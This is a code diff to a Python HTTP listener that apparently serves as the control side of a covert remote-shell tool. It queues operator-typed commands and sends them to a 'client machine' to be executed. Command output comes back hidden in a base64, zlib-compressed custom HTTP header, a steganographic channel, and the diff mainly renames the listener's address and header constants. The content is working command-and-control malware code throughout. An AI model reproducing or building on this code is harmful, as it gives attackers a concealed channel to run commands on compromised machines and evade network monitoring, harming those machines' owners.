@@ -11,11 +11,11 @@ import zlib
 import threading
 import queue
 import time
-from utils import SERVER_IP, SERVER_PORT
+from utils import LISTENER_IP, LISTENER_PORT, STEGO_HEADER_NAME
 
 WEB_DIRECTORY = 'web' # Root directory of website files.
 
-# The input to be executed on the client machine (Queue is thread-safe)
+# The inputs entered by the user, to be sent to the client to be executed (the `queue` library is thread-safe)
 user_inputs = queue.Queue()
 
 class RequestHandler(SimpleHTTPRequestHandler):
@@ -23,6 +23,7 @@ class RequestHandler(SimpleHTTPRequestHandler):
     Instantiated on each HTTP request to handle the request.
     '''
     def __init__(self, *args, **kwargs):
+        # Set directory to be the web directory
         super().__init__(*args, directory=WEB_DIRECTORY, **kwargs)
     
     def log_message(self, format, *args):
@@ -30,7 +31,7 @@ class RequestHandler(SimpleHTTPRequestHandler):
 
     def get_encoded_data(self):
         # Retrieve the encoded data from the HTTP header
-        encoded_data = self.headers.get('X-Stego-Data')
+        encoded_data = self.headers.get(STEGO_HEADER_NAME)
         if encoded_data:
             # Decode the data
             compressed_bytes = base64.b64decode(encoded_data)
@@ -57,7 +58,7 @@ class RequestHandler(SimpleHTTPRequestHandler):
         self.wfile.write(bytes(file_content, 'utf-8'))
 
     def do_GET(self):
-        # self.serve_web_content()
+        # self.serve_web_content() # CURRENTLY NOT USED
         output = self.get_encoded_data()
         # Display command output from client machine, including current working directory.
         print("\n" + output + "\n")
@@ -70,7 +71,7 @@ class RequestHandler(SimpleHTTPRequestHandler):
         self.wfile.write(user_inputs.get().encode())
 
 def run_http_server():
-    server_address = (SERVER_IP, SERVER_PORT)
+    server_address = (LISTENER_IP, LISTENER_PORT)
     httpd = HTTPServer(server_address, RequestHandler)
     httpd.serve_forever()
 
